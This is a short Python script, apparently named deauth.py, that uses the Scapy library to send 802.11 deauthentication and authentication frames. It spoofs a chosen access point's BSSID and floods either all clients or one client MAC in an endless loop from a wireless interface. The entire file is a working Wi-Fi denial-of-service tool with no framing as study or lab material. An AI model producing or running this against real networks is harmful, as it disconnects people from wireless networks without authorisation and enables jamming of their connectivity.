from scapy.all import *
import sys
import os

def deauth(INTERFACE, AP):
    print("deauth")
    dot11 = Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=AP, addr3=AP)
    packet = RadioTap() / dot11 / Dot11Deauth()
    sendp(packet, iface=INTERFACE, inter=0.100, loop=1)
    return
  

def deauth2(INTERFACE, AP, CLIENT):
    print("deauth2")
    dot11 = Dot11(addr1=CLIENT, addr2=AP, addr3=AP)
    packet = RadioTap() / dot11 / Dot11Deauth()
    sendp(packet, iface=INTERFACE, inter=0.100, loop=1)
    return

def auth(INTERFACE, AP):
    print("auth")
    dot11 = Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=AP, addr3=AP)
    packet = RadioTap() / dot11 / Dot11Auth()
    sendp(packet, iface=INTERFACE, inter=0.100, loop=1)
    return

def auth2(INTERFACE, AP, CLIENT):
    dot11 = Dot11(addr1=CLIENT, addr2=AP, addr3=AP)
    packet = RadioTap() / dot11 / Dot11Auth()
    sendp(packet, iface=INTERFACE, inter=0.100, loop=1)
    return

if __name__ == "__main__":

    if len(sys.argv) < 3:
        print("Usage : python3 deauth.py <interface> <bssid> [<client_MAC>] [-auth]")
        exit(0)

    elif len(sys.argv) == 3:
        deauth(sys.argv[1], sys.argv[2])
        exit(0)

    elif len(sys.argv) == 4 and sys.argv[3] != "-auth":
        deauth2(sys.argv[1], sys.argv[2], sys.argv[3])
        exit(0)

    elif len(sys.argv) == 4 and sys.argv[3] == "-auth":
        auth(sys.argv[1], sys.argv[2])
        exit(0)

    elif len(sys.argv) == 5 and sys.argv[4] == "-auth":
        auth2(sys.argv[1], sys.argv[2], sys.argv[3])
        exit(0)

    else :
        print("Usage : python3 deauth.py <interface> <bssid> [<client_MAC>] [-auth]")
        exit(0)
